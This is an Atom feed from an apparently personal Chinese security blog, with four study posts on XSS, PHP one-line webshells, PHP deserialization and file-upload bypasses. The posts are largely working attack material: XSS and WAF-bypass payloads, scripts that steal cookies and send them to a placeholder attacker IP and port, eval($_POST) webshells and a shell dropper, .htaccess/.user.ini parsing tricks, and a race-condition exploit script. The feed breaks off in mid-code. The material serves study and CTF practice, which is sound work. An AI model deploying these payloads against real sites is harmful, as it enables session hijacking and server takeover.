<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Robin</title>
  
  <subtitle>LiuGuobin&#39;s blog</subtitle>
  <link href="https://liu1272.github.io/atom.xml" rel="self"/>
  
  <link href="https://liu1272.github.io/"/>
  <updated>2023-04-21T07:52:15.503Z</updated>
  <id>https://liu1272.github.io/</id>
  
  <author>
    <name>liuGuobin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>XSS跨站攻击</title>
    <link href="https://liu1272.github.io/2023/04/21/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/"/>
    <id>https://liu1272.github.io/2023/04/21/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/</id>
    <published>2023-04-21T06:32:00.000Z</published>
    <updated>2023-04-21T07:52:15.503Z</updated>
    
    <content type="html"><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>   XSS又叫CSS（Cross Site Script）是指恶意攻击者往Web页面里插入恶意Script代码<br>   当用户<code>浏览该页</code>时，其中的Script代码会被执行，从而达到恶意攻击用户的目的。<br>   xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，所以xss漏洞关键就是寻找参数未过滤的输出函数。<br>   常见的输出函数有：echo printf print print_r sprintf die var-dump var_export</p><h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><p>（1）攻击者对含有漏洞的服务器发起XSS攻击（注入JS代码）<br>（2）诱使受害者打开受到攻击的服务器URL<br>（3）受害者在Web浏览器中打开URL时自动执行恶意脚本</p><h4 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h4><p>（1）反射型XSS：&lt;非持久化&gt;<br>需要欺骗用户自己去点击链接才能触发XSS代码，一般容易出现在搜索页面，由后端代码进行处理。<br>（2）存储型XSS：&lt;持久化&gt;<br>每当有用户访问污染页面的时候都会触发代码执行。代码存储在服务器数据库中，如在个人信息或发表文章等地方。<br>（3）DOM型XSS：<br>DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。<br>DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。<br>客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行。<br>如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。<br>一般是浏览器前端代码进行处理。</p><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>1.挂马<br>2.盗取用户Cookie。<br>3.DOS（拒绝服务）客户端浏览器。<br>4.钓鱼攻击，高级的钓鱼技巧。<br>5.删除目标文章、恶意篡改数据、嫁祸。<br>6.劫持用户Web行为，甚至进一步渗透内网。<br>7.爆发Web2.0蠕虫。<br>8.蠕虫式的DDoS攻击。<br>9.蠕虫式挂马攻击、刷广告、刷浏量、破坏网上数据</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>各种标签的XSS形式</strong></p><pre><code>&lt;script&gt; 标签用于定义客户端脚本，比如 JavaScript。&lt;script&gt;alert(1);&lt;/script&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;&lt;img&gt; 标签定义 HTML 页面中的图像。&lt;img src=1 onerror=alert(1);&gt;&lt;img src=1 onerror=alert(&quot;xss&quot;);&gt;&lt;input&gt; 标签规定了用户可以在其中输入数据的输入字段。onfocus 事件在对象获得焦点时发生：&lt;input onfocus=alert(1);&gt;&lt;input onblur=alert(1) autofocus&gt;&lt;input autofocus&gt;&lt;input onfocus=&quot;alert(1);&quot; autofocus&gt;&quot; οnclick=alert(1)&gt;        这样需要点击一下输入框&lt;br&gt;&quot; onmouseover=alert(1)&gt;    需要鼠标划过输入框&lt;br&gt;&lt;details&gt; 标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。ontoggle 事件规定了在用户打开或关闭 &lt;details&gt; 元素时触发：&lt;details ontoggle=alert(1);&gt;&lt;svg&gt; 标签用来在HTML页面中直接嵌入SVG 文件的代码。&lt;svg onload=alert(1);&gt;&lt;select&gt; 标签用来创建下拉列表。&lt;select onfocus=alert(1)&gt;&lt;/select通过autofocus属性规定当页面加载时元素应该自动获得焦点，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：&lt;select onfocus=alert(1) autofocus&gt;&lt;iframe&gt; 标签会创建包含另外一个文档的内联框架。&lt;iframe onload=alert(1);&gt;&lt;/iframe&gt;&lt;video&gt; 标签定义视频，比如电影片段或其他视频流。&lt;audio&gt; 标签定义声音，比如音乐或其他音频流。&lt;audio src=x  onerror=alert(1);&gt;&lt;video&gt;&lt;source onerror=alert(1)&gt;&lt;body&gt; 标签定义文档的主体。&lt;body onload=alert(1);&gt;onscroll 事件在元素滚动条在滚动时触发。我们可以利用换行符以及autofocus，当用户滑动滚动条的时候自动触发，无需用户去点击触发&lt;bodyonscroll=alert(1);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;&lt;textarea&gt; 标签定义一个多行的文本输入控件。&lt;textarea onfocus=alert(1); autofocus&gt;&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐&lt;marquee onstart=alert(1)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以&lt;isindex type=image src=1 onerror=alert(1)&gt;//仅限于IE</code></pre><p><strong>绕过过滤方法</strong></p><pre><code>【空格过滤】/**/注释符号绕过/符号绕过【引号过滤】如果是html标签中，可以不用引号在js中，可以用反引号代替单双引号【括号过滤】使用throw绕过 throw 语句用于当错误发生时抛出一个错误【关键字过滤】大小写绕过双写绕过字符串拼接绕过（利用eval()函数）在js中用反引号代替单双引号编码绕过    Unicode编码绕过    &lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&quot;&gt;    javasc&amp;#x72;&amp;#x69;pt:alert(/xss/)          (编码了r和i)    &lt;img src=&quot;x&quot; onerror=&quot;eval(&#39;\u0061&#39;)&quot;&gt;    url编码绕过    &lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#39;%61&#39;))&quot;&gt;    &lt;iframe src=&quot;data:text/html,%3C&quot;&gt;&lt;/iframe&gt;    Ascii码绕过    &lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108))&quot;&gt;    hex绕过    &lt;img src=x onerror=eval(&#39;\x61&#39;)&gt;    base64绕过    &lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#39;XXXXX==&#39;))&quot;&gt;    &lt;iframe src=&quot;data:text/html;base64,XXXXX==&quot;&gt;【过滤url地址】使用url编码    &lt;img src=&quot;x&quot; onerror=document.location=`http://%77/`&gt;    javasc&amp;#x72;&amp;#x69;pt:alert(&#39;xsshttp://&#39;)使用IP    十进制IP    &lt;img src=&quot;x&quot; onerror=document.location=`http://2130706433/`&gt;    八进制IP    &lt;img src=&quot;x&quot; onerror=document.location=`http://0177.0.0.01/`&gt;    十六进制IP    &lt;img src=&quot;x&quot; onerror=document.location=`http://0x7f.0x0.0x0.0x1/`&gt;    html标签中用//代替http://    &lt;img src=&quot;x&quot; onerror=document.location=`//www.baidu.com`&gt;    使用\\    使用中文逗号代替英文逗号    &lt;img src=&quot;x&quot; onerror=&quot;document.location=`http:\\www。baidu。com`&quot;&gt;【单引号闭合+htmlspecialchars函数绕过】&#39;onmouseover=&#39;alert(/xss/)【JavaScript伪协议】&quot;&gt;&lt;a href=javascript:alert(/xss/)&gt;                  o_n和&lt;scr_ipt&gt;过滤【HttpOnly绕过】什么是HttpOnly？cookie中设置了HttpOnly属性后js脚本将无法读取到cookie信息但是使用下面这样仍然可以读取Cookie cookies[]=request.getCookies();【其它waf绕过思路】（1）标签语法替换&lt;scr&lt;script&gt;ipt&gt;alert(&quot;XSS&quot;)&lt;/scr&lt;script&gt;ipt&gt;&lt;script src=&quot;http://xxx/&quot;&gt;&lt;/script&gt;（2）特殊符号干扰（3）提交方式更改（4）垃圾数据溢出（5）加密解密算法（6）结合其他漏洞绕过</code></pre><h4 id="结合其他漏洞绕过"><a href="#结合其他漏洞绕过" class="headerlink" title="结合其他漏洞绕过"></a>结合其他漏洞绕过</h4><pre><code>WAF名称：CloudflarePayload：&lt;a”/onclick=(confirm)()&gt;click绕过技术：非空格填充WAF名称：WordfencePayload：&lt;a/href=javascript&amp;colon;alert()&gt;click绕过技术：数字字符编码WAF名称：BarracudaPayload：&lt;a/href=Java%0a%0d%09script&amp;colon;alert()&gt;click绕过技术：数字字符编码WAF名称：ComodoPayload：&lt;d3v/onauxclick=(((confirm)))“&gt;click绕过技术：黑名单中缺少事件处理器以及函数调用混淆WAF名称：F5Payload：&lt;d3v/onmouseleave=[2].some(confirm)&gt;click绕过技术：黑名单中缺少事件处理器以及函数调用混淆WAF名称：ModSecurityPayload：&lt;details/open/ontoggle=alert()&gt;绕过技术：黑名单中缺少标签或事件处理器WAF名称：dotdefenderPayload：&lt;details/open/ontoggle=(confirm)()//绕过技术：黑名单中缺少结束标签、事件处理器和函数调用混淆</code></pre><h4 id="还有一些很重要的东西"><a href="#还有一些很重要的东西" class="headerlink" title="还有一些很重要的东西"></a>还有一些很重要的东西</h4><p>xss网站最好自己搭建一个，因为可能会过滤xss关键字<br>最好使用只带有数字的域名或ip<br>利用vps，用nc端口监听</p><h4 id="XSStrike工具使用"><a href="#XSStrike工具使用" class="headerlink" title="XSStrike工具使用"></a>XSStrike工具使用</h4><p><a href="https://blog.csdn.net/RuoLi_s/article/details/113192507?ops_request_misc=&request_id=&biz_id=102&utm_term=XSStrike&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-113192507.nonecase&spm=1018.2226.3001.4187"><strong>使用说明</strong></a></p><h4 id="XSS的防御措施"><a href="#XSS的防御措施" class="headerlink" title="XSS的防御措施"></a>XSS的防御措施</h4><p>（1）编码：对用户输入的数据进行HTML Entity编码<br>（2）过滤：移除用户上传的DOM属性，如onerror等，移除用户上传的style节点，script节点，iframe节点等。<br>（3）校正：避免直接对HTML Entity编码，使用DOM Prase转换，校正不配对的DOM标签。</p><h4 id="各种姿势"><a href="#各种姿势" class="headerlink" title="各种姿势"></a>各种姿势</h4><pre><code>&lt;script&gt;window.open(&#39;http://你的公网ip:端口号/&#39;+document.cookie)&lt;/script&gt;&lt;script&gt;var img = document.createElement(&quot;img&quot;);img.src = &quot;http://你的公网ip:端口号/?cookie=&quot;+document.cookie;&lt;/script&gt;&lt;script&gt;window.location.href=&#39;http://你的公网ip:端口号/&#39;+document.cookie&lt;/script&gt;&lt;script&gt;location.href=&#39;http://你的公网ip:端口号/&#39;+document.cookie&lt;/script&gt;&lt;input onfocus=&quot;window.open(&#39;http://你的公网ip:端口号/&#39;+document.cookie)&quot; autofocus&gt;&lt;svg onload=&quot;window.open(&#39;http://你的公网ip:端口号/&#39;+document.cookie)&quot;&gt;&lt;iframe onload=&quot;window.open(&#39;http://你的公网ip:端口号/&#39;+document.cookie)&quot;&gt;&lt;/iframe&gt;&lt;body onload=&quot;window.open(&#39;http://你的公网ip:端口号/&#39;+document.cookie)&quot;&gt;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h4&gt;&lt;p&gt;   XSS又叫CSS（Cross Site Script）是指恶意攻击者往Web页面里插入恶意Script代码&lt;br&gt;  </summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>一句话木马</title>
    <link href="https://liu1272.github.io/2023/04/16/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
    <id>https://liu1272.github.io/2023/04/16/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</id>
    <published>2023-04-16T15:01:00.000Z</published>
    <updated>2023-04-16T15:14:06.042Z</updated>
    
    <content type="html"><![CDATA[<h4 id="什么是一句话木马"><a href="#什么是一句话木马" class="headerlink" title="什么是一句话木马"></a>什么是一句话木马</h4><p>  一句话木马是一种短小精悍的恶意代码，通常只有一行之长。<br>  这种木马可以以上传文件、修改配置等方式将恶意代码植入到受害者服务器上<br>  然后通过一些特殊手法在服务器端执行，以达到入侵控制目的。</p><h4 id="常见的一句话木马"><a href="#常见的一句话木马" class="headerlink" title="常见的一句话木马"></a>常见的一句话木马</h4><p>我们接触的一句话木马大多为这种，它需要在PHP环境中才可使用</p><pre><code>&lt;?php @eval($_POST[cmd]);  ?&gt;</code></pre><h4 id="木马原理"><a href="#木马原理" class="headerlink" title="木马原理"></a>木马原理</h4><pre><code>（1）$_POST[cmd]    $_POST 是 PHP 中的一个超全局变量，POST方式提交的所有变量，都会保存在此数组中，变量名即为键名（2）eval()    eval() 函数在 PHP 中用于执行字符串中的代码并返回执行结果。    该函数对php语法要求严格，所传入语句必须以&quot; ; &quot;号结尾（3）@    符号@的作用是屏蔽该语句的报错信息    如果站点PHP版本&gt;=8.0的话会报错（4）脉络梳理    用eval函数，将我们post方式提交的名为cmd的变量，当做PHP代码执行，cmd变量可为任何攻击代码</code></pre><h4 id="可用于条件竞争的一句话木马"><a href="#可用于条件竞争的一句话木马" class="headerlink" title="可用于条件竞争的一句话木马"></a>可用于条件竞争的一句话木马</h4><pre><code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])；  ?&gt;&#39; ); ?&gt;</code></pre><p>这段代码是用来创建一个名为shell.php的文件，并在其中写入一段代码。<br>这段代码的作用是接受一个POST请求中的cmd参数，并将其作为PHP代码执行。</p><h4 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h4><p><strong>木马内容</strong></p><pre><code>GIF89a&lt;?php @eval($_POST[cmd])；  ?&gt; //GIF89a 为了绕过可能存在的MIME头检测</code></pre><p><strong>.htaccess文件</strong></p><pre><code>&lt;FilesMatch &quot;jpg&quot;&gt;  SetHandler application/x-httpd-php&lt;/FilesMatch&gt;//大体意思是设置当前目录所有带jpg的文件名都使用php解析//无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行</code></pre><p><strong>.user.ini扩展文件</strong></p><pre><code>auto_prepend_file=shell.jpg //意思就是当前目录中的php文件的页头会自动去包含shell.jpg中的文件内容//auto_append_file 是页尾包含</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;什么是一句话木马&quot;&gt;&lt;a href=&quot;#什么是一句话木马&quot; class=&quot;headerlink&quot; title=&quot;什么是一句话木马&quot;&gt;&lt;/a&gt;什么是一句话木马&lt;/h4&gt;&lt;p&gt;  一句话木马是一种短小精悍的恶意代码，通常只有一行之长。&lt;br&gt;  这种木马可以以上传文件</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化</title>
    <link href="https://liu1272.github.io/2023/04/16/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://liu1272.github.io/2023/04/16/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2023-04-15T16:12:00.000Z</published>
    <updated>2023-04-18T07:44:30.341Z</updated>
    
    <content type="html"><![CDATA[<h4 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h4><p>在各类语言中，将对象的状态信息转换为可存储或可传输的过程就是序列化<br>序列化的逆过程就是便是反序列化，主要是为了方便对象传输。<br>为了完整安全地将对象保存到文件或数据库中，或者在网络上传输对象，就需要使用序列化。</p><p>不同类型数据序列化之后的形式:</p><pre><code>$number = 34;$float = 11.11111;$str = &#39;user&#39;;$bool = true;$null = NULL;$arr = array(&#39;a&#39; =&gt; 10, &#39;b&#39; =&gt; 200);$test = new TEST(&#39;uu&#39;, true);$test2 = new TEST(&#39;uu&#39;, true);$test2-&gt;data = &amp;$test2-&gt;data2;i:34;d:11.11111;s:4:&quot;user&quot;;b:1;N;a:2:&#123;s:1:&quot;a&quot;;i:10;s:1:&quot;b&quot;;i:200;&#125;O:4:&quot;TEST&quot;:3:&#123;s:4:&quot;data&quot;;s:2:&quot;uu&quot;;s:5:&quot;data2&quot;;s:9:&quot;dazzhuang&quot;;s:10:&quot;TESTpass&quot;;b:1;&#125;O:4:&quot;TEST&quot;:3:&#123;s:4:&quot;data&quot;;s:9:&quot;dazzhuang&quot;;s:5:&quot;data2&quot;;R:2;s:10:&quot;TESTpass&quot;;b:1;&#125;只序列化成员函数，不序列化成员方法私有属性的序列化加上类名并且在成员函数前后加上空(url编码的%00)对象内调用对象时序列化后显示为套娃形式</code></pre><p>反序列化之后:</p><pre><code>只实例化new之后object(test)#1 (3) &#123;  [&quot;a&quot;]=&gt;                      // public  string(6) &quot;benben&quot;  [&quot;b&quot;:protected]=&gt;            // protected  int(666)  [&quot;c&quot;:&quot;test&quot;:private]=&gt;       // private  bool(false)&#125;反序列化的过程只看序列化链，不管存不存在这个类反序列化不触发成员方法，也不改变类的成员方法</code></pre><p><strong>魔术方法是什么？</strong><br>是一个预定义好的，在特定情况下自动触发的方法<br><strong>魔术方法有什么作用？</strong><br>反序列化过程中，代码通过调用方法，触发代码执行<br><strong>魔术方法需要了解什么？</strong><br>触发时机、触发优先级、功能、参数、返回值</p><h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>反序列化过程中，unserialize()接收的值 (字符串)可控<br>通过更改这个值 (字符串)，得到所需要的代码，即生成的对象的属性值</p><h4 id="魔术方法全解"><a href="#魔术方法全解" class="headerlink" title="魔术方法全解"></a>魔术方法全解</h4><pre><code>（1）  __construct()触发时机: 实例化对象后立即触发功能: 提前清理不必要内容参数: 非必要返回值特点: 序列化和反序列化时不会触发（2）  __destruct()触发时机: 销毁对象时立即触发功能: 关闭文件、释放结果集参数: 不能带有任何参数特点: 序列化时不会触发（3）  __sleep()触发时机: 序列化serialize()之前功能: 返回需要被序列化存储的成员属性，删除不必要的属性参数: 成员属性返回值: 需要被序列化存储的成员属性（4）  __wakeup()触发时机: 反序列化unserialize()之前功能: 重新建立数据库连接或执行其他初始化操作参数: 不能带有任何参数特点: 序列化时不会触发（5）  __toString()触发时机: 对象被当成字符串调用时功能: 以字符串表示对象，可以自定义格式，常用于构造pop链参数: 不能带有任何参数（6）  __invoke()触发时机: 尝试以调用函数的方式调用一个对象时功能: 将一个对象像函数一样调用，在对象上下文中实现函数式编程参数: 可以接受任意数量的参数（7）  __call()触发时机: 调用一个不存在的方法时参数: 可传参返回值: 调用的不存在的方法的名称和参数（8）  __callStatic()触发时机: 静态调用或调用成员常量时使用的方法不存在时参数: 可传参返回值: 调用的不存在的方法的名称和参数（9）  __get()触发时机: 访问不存在或不可访问的属性时参数: 可传参返回值:不存在的成员属性的名称和赋的值（10）  __set()触发时机: 给不存在或不可访问的属性赋值时参数: 可传参返回值: 不存在的成员属性的名称和赋的值（11）  __isset()触发时机: 对不可访问属性使用isset()或empty()时参数: 可传参返回值: 不存在的成员属性的名称（12）  __unset()触发时机: 对不可访问属性使用unset()时参数: 可传参返回值: 不存在的成员属性的名称（13）  __clone()触发时机: 当使用clone拷贝完成一个对象后，新对象会自动调用（14）  __set_state()触发时机: 使用var_export()函数导出一个对象时，或者使用eval()函数导入一个对象时参数: 只有一个参数(数组)，包含对象的状态信息。键是对象的属性名，值是对象的属性值。功能: 用于返回一个对象的状态数组特点: 只能在类中定义，不能在对象中定义（15）  __autoload()触发时机: 使用未定义的类时，或者使用未加载的类时功能: 根据类名动态加载对应的类文件，并定义对应的类参数: 只有一个参数，即要加载的类名特点: PHP 7.2.0及以上版本中，__autoload()魔术方法已被废弃，推荐使用spl_autoload_register()（16）  __debugInfo()触发时机: 在使用var_dump()函数打印对象时功能: 被var_dump()函数输出一个数组，包含对象的调试信息参数: 没有参数</code></pre><h4 id="POP链前置知识"><a href="#POP链前置知识" class="headerlink" title="POP链前置知识"></a>POP链前置知识</h4><p><strong>POP是什么？</strong><br>在反序列化中，我们能控制的数据就是对象中的属性值<br>POP链就是利用魔法方法在里面进行多次跳转然后获取敏感数据的种payload<br><strong>POC是什么？</strong><br>POC (Proof of concept)又称概念验证，可以理解成漏洞验证程序<br>POC是一段不完整的程序，仅仅是为了证明提出者的观点的一段代码<br><strong>如何分析POP链？</strong><br>最好使用反推法！<br>1.找到可利用的函数<br>2.根据参数的传递与调用反推出哪个变量需要是什么<br>3.分析判断有哪些魔术方法可以被利用以及如何被调用<br><strong>如何利用漏洞？</strong><br><img src="https://s2.loli.net/2023/04/16/wSFIaq7h4Ol32tg.png" alt="POP链构造例子"><br><strong>构造如下:</strong><br><img src="https://s2.loli.net/2023/04/16/iSj1gtLHqTQaNsx.png" alt="POP链构造例子解析"></p><h4 id="字符串逃逸——增多"><a href="#字符串逃逸——增多" class="headerlink" title="字符串逃逸——增多"></a>字符串逃逸——增多</h4><p>字符串以<code>;&#125;</code>结束，后面的不看<br>空（N）不算在内</p><p><img src="https://s2.loli.net/2023/04/17/qd4L8MtOH2bPKQk.png" alt="字符串增多例题01"><br><img src="https://s2.loli.net/2023/04/17/jS5ActwNfYMXhbx.png" alt="字符串增多例题02"></p><h4 id="字符串逃逸——减少"><a href="#字符串逃逸——减少" class="headerlink" title="字符串逃逸——减少"></a>字符串逃逸——减少</h4><p><img src="https://s2.loli.net/2023/04/18/71zLkKi9cTGwZho.png" alt="字符串减少例题01"><br><img src="https://s2.loli.net/2023/04/18/KbeAu2j7RMiWCkT.png" alt="字符串减少02例题"></p><h4 id="weakup魔术方法绕过"><a href="#weakup魔术方法绕过" class="headerlink" title="weakup魔术方法绕过"></a>weakup魔术方法绕过</h4><p>反序列化漏洞:<br>CVE-2016-7124<br>漏洞产生原因:<br>如果存在wakeup方法则反序列化前先调用wakeup方法<br>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过wakeup()<br>如果同时还有正则表达式匹配可以用+6代替6<br>记得url编码</p><h4 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h4><p><img src="https://s2.loli.net/2023/04/18/SQVydNngi8rAEkm.png" alt="前置知识"><br><img src="https://s2.loli.net/2023/04/18/mXDo6Qh9V4KF58E.png" alt="PHP存储时"><br><img src="https://s2.loli.net/2023/04/18/bKH46heyWJgDrlw.png" alt="PHP_serialize存储时"><br><img src="https://s2.loli.net/2023/04/18/JRzB3V9TbdjMsUP.png" alt="PHP_binary存储时（少见）"><br><img src="https://s2.loli.net/2023/04/18/xcVBeOpRk5vQPG1.png" alt="漏洞成因及其利用"></p><h4 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h4><p><img src="https://s2.loli.net/2023/04/18/uJm29U1KoICiXl3.png" alt="phar反序列化前置知识"><br><img src="https://s2.loli.net/2023/04/18/ujNiJdK79YUWPyS.png" alt="phar文件结构"><br><img src="https://s2.loli.net/2023/04/18/RDSGLEqZCg3szPv.png" alt="漏洞原理"><br><img src="https://s2.loli.net/2023/04/18/ZsUD1jKMyVeimF4.png" alt="漏洞利用条件"><br>注:<br>（1）phar文件只看文件内容，不看后缀名<br>（2）使用时利用伪协议phar://文件名读取该文件</p><h4 id="其它反序列化链"><a href="#其它反序列化链" class="headerlink" title="其它反序列化链"></a>其它反序列化链</h4><p>找到该框架的版本以及其所用的序列化链<br>从网上找到POC直接利用就行</p><h4 id="使用条件竞争执行phar反序列化"><a href="#使用条件竞争执行phar反序列化" class="headerlink" title="使用条件竞争执行phar反序列化"></a>使用条件竞争执行phar反序列化</h4><pre><code>import requestsimport threadingimport base64url = &#39;&#39;f = open(&#39;./phar.phar&#39;, &#39;rb&#39;)data = f.read()flag = Falsedef work1():    requests.post(url=url+&quot;?fn=a&quot;, data=data)def work2():    global flag    r = requests.post(url=url+&quot;?fn=phar://phar.phar/&quot;, data=&quot;&quot;)    if &quot;flag&#123;&quot; in r.text and flag is False:        print(base64.b64encode(r.text.encode()))        flag = Truewhile flag is False:    a = threading.Thread(target=work1)    b = threading.Thread(target=work2)    a.start()    b.start()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;基础概念&quot;&gt;&lt;a href=&quot;#基础概念&quot; class=&quot;headerlink&quot; title=&quot;基础概念&quot;&gt;&lt;/a&gt;基础概念&lt;/h4&gt;&lt;p&gt;在各类语言中，将对象的状态信息转换为可存储或可传输的过程就是序列化&lt;br&gt;序列化的逆过程就是便是反序列化，主要是为了方便对象</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>文件上传</title>
    <link href="https://liu1272.github.io/2023/04/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>https://liu1272.github.io/2023/04/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2023-04-14T03:24:00.000Z</published>
    <updated>2023-04-17T17:02:38.780Z</updated>
    
    <content type="html"><![CDATA[<h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>文件上传漏洞可以分为以下几类：</p><pre><code>类型限制绕过：Web应用程序对上传文件的类型进行限制，黑名单或白名单方式              攻击者可通过在请求包中伪造Content-Type字段或使用特定的文件扩展名的方式绕过限制，上传恶意文件。文件名欺骗：攻击者通过修改上传文件的文件名，绕过文件类型检测，从而上传恶意文件。目录遍历：攻击者通过在上传文件的路径中使用../等符号，绕过应用程序的安全限制，成功上传文件到其他目录。权限提升：攻击者上传恶意文件，通过漏洞提升权限，获取更高的系统权限。二进制文件上传：攻击者上传二进制文件到服务器，通过漏洞执行恶意代码。</code></pre><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>burp抓包勤快点，多上传马，慢慢测试过滤规则，多积累木马。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><pre><code>【绕过前端检测】禁用JS更改前端文件更改文件后缀【后端校验文件类型】将Content-Type内容修改成image/png【后端检测文件后缀 · 黑名单】上传.user.ini        // auto_prepend_file = 1.jpg或者.htaccess        // AddType application/x-httpd-php .jpg上传木马并更改为合法后缀和文件类型【文件内容过滤】先使用二分法确定过滤了什么东西使用phP绕过对php的检测双写pphphp绕过末尾加.绕过末尾加空格绕过末尾加::&amp;DATA绕过%00截断上传0x00截断上传MINE绕过&lt;? echo &#39;123&#39;;?&gt;                               //short_open_tags=on&lt;?=(表达式)?&gt;  等价于 &lt;?php echo (表达式)?&gt;    //无限制&lt;% echo &#39;123&#39;;%&gt;                               //asp_tags=on php_version &lt; 7&lt;script language=”php”&gt;echo &#39;123&#39;; &lt;/script&gt;   //php_vsesion &lt; 7可以用&#123;&#125;代替[]过滤了()，那就用反引号&#39;对log过滤了使用lo&quot;.&quot;g绕过【UA注入日志包含】上传完.user.ini        // auto_append_file=&quot;1.png&quot;再上传图片             // &lt;?=include&quot;/var/log/nginx/access.log&quot;?&gt;访问网站然后修改ua头信息【文件头检测】增加对应的文件头GIF文件:  GIF89APNG文件:  89 50 4E 47 0D 0A 1A 0A【远程包含文件】使用  https://www.bejson.com/convert/ip2int/  将IP转换为纯数字&lt;?=include&#39;http://IP转换/&#39;&gt;【条件竞争】session包含，前文已经详细写过，不再重复描述。【图片二次渲染】将木马插入到图片中，类似于图片马脚本放在文末【getimagesize 绕过】getimagesize() 获取上传文件信息，图片马绕过【exif_imagetype 绕过】getimagesize() 获取上传文件信息，图片马绕过【文件大小检测】拒绝传入太小或太大的文件，控制文件大小，建议使用图片马【Apache陌生后缀解析漏洞】Apache认为一个文件可以拥有多个扩展名，哪怕没有文件名，也可以拥有多个扩展名。Apache认为应该从右到左开始判断解析方法的。如果最右侧的扩展名为不可识别的，就继续往左判断，直到判断到文件名为止。【蚁剑生成shell脚本】      // 连接密码: 123&lt;?php 